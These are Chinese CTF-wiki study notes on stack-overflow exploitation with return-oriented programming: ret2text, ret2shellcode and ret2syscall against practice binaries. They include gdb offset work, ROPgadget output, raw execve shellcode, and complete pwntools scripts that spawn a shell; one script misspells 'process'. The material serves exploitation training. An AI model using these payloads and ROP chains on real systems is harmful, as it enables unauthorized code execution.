# CTF-Wiki ROP

ROP, Return Oriented Programming，主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 gadgets 来改变某些寄存器或变量的值，从而控制程序的执行流程。

> 所谓 gadgets 就是以 ret 结尾的指令序列。

- 程序存在溢出，可以控制返回地址
- 可以找到满足条件的 gadgets 以及相应的地址（可能需要动态获取地址

## ret2text

控制程序执行本身已有的代码

[ret2text](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text)

```shell
gdb-peda$ checks
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

使用 IDA 查看程序逻辑，找到危险函数 gets

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(_bss_start, 0, 1, 0);
  puts("There is something amazing here, do you know anything?");
  gets(&s);
  printf("Maybe I will tell you next time !");
  return 0;
}
```

使用 gdb 计算 offset

```assembly
ECX: 0xffffffff
EDX: 0xffffffff
ESI: 0xf7fb1000 --> 0x1dfd6c 
EDI: 0xf7fb1000 --> 0x1dfd6c
EBP: 0xffffd5c8 --> 0x0
ESP: 0xffffd540 --> 0xffffd55c --> 0x0
EIP: 0x80486ae (<main+102>:     call   0x8048460 <gets@plt>)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x80486a2 <main+90>: call   0x8048480 <puts@plt>
   0x80486a7 <main+95>: lea    eax,[esp+0x1c]
   0x80486ab <main+99>: mov    DWORD PTR [esp],eax
=> 0x80486ae <main+102>:        call   0x8048460 <gets@plt>
   0x80486b3 <main+107>:        mov    DWORD PTR [esp],0x80487a4
   0x80486ba <main+114>:        call   0x8048450 <printf@plt>
   0x80486bf <main+119>:        mov    eax,0x0
   0x80486c4 <main+124>:        leave
Guessed arguments:
arg[0]: 0xffffd55c --> 0x0
[------------------------------------stack-------------------------------------]
0000| 0xffffd540 --> 0xffffd55c --> 0x0
0004| 0xffffd544 --> 0x0
0008| 0xffffd548 --> 0x1
0012| 0xffffd54c --> 0x0
0016| 0xffffd550 --> 0xffffd5a0 --> 0x1
0020| 0xffffd554 --> 0x0
0024| 0xffffd558 --> 0xf7ffd000 --> 0x28f24 
0028| 0xffffd55c --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x080486ae      24      in ret2text.c
gdb-peda$ 
```

直接计算 buff 位置 `0xffffd55c` 到 EBP `0xffffd5c8` 的偏移，再 +4 跳过 old EBP 即可覆盖返回地址。

```python
# exp.py
from pwn import *
r = proccess('./ret2text')
target = 0x0804863A
r.sendline('a' * (0xc8-0x5c+4) + p32(target))
r.interactive()
```

## ret2shellcode

控制程序执行 shellcode，需要自己填充 shellcode，填充区域需要有可执行权限。

[ret2shellcode](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode)

```assembly
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : Partial
```

啥都没开，可以填充 shellcode。	

```c++
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("No system for you this time !!!");
  gets(&s);
  strncpy(buf2, &s, 0x64u);
  printf("bye bye ~");
  return 0;
}
```

可以找到 buf2 在 bss 段，用 gdb 查看有可执行权限，可以实现 ret2shellcode

在 gdb 中计算偏移地址，还是 buff 位置到 EBP 的偏移 +4，先填入 shellcode 之后任意字符填充，然后填入 buf2 地址。

```python
# exp.py
from pwn import *

r = process('./ret2shellcode')
sc = asm(shellcraft.sh())
target = 0x804a080
payload = sc + 'a'*(112 - len(sc)) + p32(target)
print payload
r.sendline(payload)
r.interactive()
```

用的 shellcode 是 pwntools 生成的，打印出来：

```assembly
	/* execve(path='/bin///sh', argv=['sh'], envp=0) */
    /* push '/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    mov ebx, esp
    /* push argument array ['sh\x00'] */
    /* push 'sh\x00\x00' */
    push 0x1010101
    xor dword ptr [esp], 0x1016972
    xor ecx, ecx
    push ecx /* null terminate */
    push 4
    pop ecx
    add ecx, esp
    push ecx /* 'sh\x00' */
    mov ecx, esp
    xor edx, edx
    /* call execve() */
    push SYS_execve /* 0xb */
    pop eax
    int 0x80
```

## sniperoj-pwn100-shellcode

编译的时候用 `gcc -z execstack` 关闭 NX

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/shellcode'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+0h] [rbp-10h]
  __int64 v5; // [rsp+8h] [rbp-8h]

  buf = 0LL;
  v5 = 0LL;
  setvbuf(_bss_start, 0LL, 1, 0LL);
  puts("Welcome to Sniperoj!");
  printf("Do your kown what is it : [%p] ?\n", &buf);
  puts("Now give me your answer : ");
  read(0, &buf, 64uLL);
  return 0;
}
```

NX 关了，还给了 buf 的地址，所以就直接在栈里填 shellcode 然后执行。

但是不能填在 buf 起始的 24 bytes 处，因为 shellcode 里有 push 的话就会覆盖自身。

所以就在返回地址后填充 shellcode，大小限制不再是 24 而是 32，因为 read 一共就读入 64 ，没注意看卡了半天。。。tcl

```python
from pwn import *

r = process('./shellcode')

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
print disasm(shellcode_x64)

offset = 0x10 + 8
r.recvuntil('[')
buf_addr = r.recvuntil(']', drop=True)
print buf_addr
buf_addr = int(buf_addr, 16)
payload = 'a'*offset + p64(buf_addr + 32) + asm(shellcode_x64)

r.sendline(payload)
r.interactive()
```

## ret2syscall

控制程序执行系统调用

[ret2syscall](https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop)

```shell
gef➤  checksec
[+] checksec for '/home/kali/pwn/ret2syscall'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+1Ch] [ebp-64h]

  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 1, 0);
  puts("This time, no system() and NO SHELLCODE!!!");
  puts("What do you plan to do?");
  gets(&v4);
  return 0;
}
```

还是从 gets 处溢出，只不过不能用程序自身代码或填入 shellcode的方式 getshell。程序里有 `/bin/sh` 字符串，构造系统调用 `execve("/bin/sh")`，需要控制寄存器的值：

- eax = 0xb
- ebx = \$(“/bin/sh”)
- ecx = edx = 0

需要构造 ROP chain 控制寄存器的值，使用 ROPgadget 找到程序中可用的 gadgets：

```shell
$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'pop eax'
0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret
0x080bb196 : pop eax ; ret
0x0807217a : pop eax ; ret 0x80e
0x0804f704 : pop eax ; ret 3
0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret

$ ROPgadget --binary ret2syscall --only 'pop|ret' | grep 'pop ebx' | grep 'pop ecx' | grep 'pop edx' 
0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret

$ ROPgadget --binary ret2syscall --string '/bin/sh'
Strings information
============================================================
0x080be408 : /bin/sh

$ ROPgadget --binary ret2syscall --only 'int' | grep '0x80'
0x08049421 : int 0x80
```

找到了可以控制 eax 和同时控制三个寄存器的 gadgets、系统调用以及字符串地址，接下来就是通过栈溢出，依次执行 gadgets，最后执行 syscall。

还是先用 gdb 计算偏移地址，然后覆盖

```python
##coding=utf8
from pwn import *

r = process('./ret2syscall')

offset = 0xffffd5d8 - 0xffffd56c + 4

pop_eax = 0x080bb196
pop_edx_ecx_ebx = 0x0806eb90
bin_sh = 0x080be408
syscall = 0x08049421

r.sendline('a'*offset + p32(pop_eax) + p32(0xb) + p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bin_sh) + p32(syscall))

r.interactive()
```

